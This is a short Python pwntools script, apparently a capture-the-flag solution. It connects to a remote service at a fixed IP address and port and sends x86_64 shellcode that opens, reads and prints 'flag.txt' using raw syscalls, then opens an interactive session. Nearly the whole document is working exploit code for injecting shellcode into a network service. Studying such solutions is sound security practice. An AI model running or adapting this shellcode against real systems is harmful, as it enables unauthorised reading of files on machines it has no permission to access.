from pwn import *

context.arch = "amd64"
context.os = "linux"

p = remote("34.170.146.252", 44934)
 
sc = asm("""
    /* Put "flag.txt\\0" on the stack.
       x86_64 is little endian, so 0x7478742e67616c66 is stored as:
       66 6c 61 67 2e 74 78 74 == "flag.txt".
       push rax before that adds the trailing NULL bytes. */
    xor     eax, eax
    push    rax                         /* trailing NULL bytes */
    mov     rax, 0x7478742e67616c66     /* "flag.txt" */
    push    rax

    /* open("flag.txt", O_RDONLY) */
    mov     rdi, rsp                    /* pathname */
    xor     esi, esi                    /* flags = O_RDONLY */
    mov     eax, 2                      /* SYS_open */
    syscall

    /* read(fd, rsp, 0x100) */
    mov     rdi, rax                    /* fd */
    mov     rsi, rsp                    /* buf */
    mov     edx, 0x100                  /* count */
    xor     eax, eax                    /* SYS_read */
    syscall

    /* write(1, rsp, bytes_read) */
    mov     edx, eax                    /* count = bytes read */
    mov     edi, 1                      /* stdout */
    mov     rsi, rsp                    /* buf */
    mov     eax, 1                      /* SYS_write */
    syscall
""")

p.send(sc)
p.interactive()
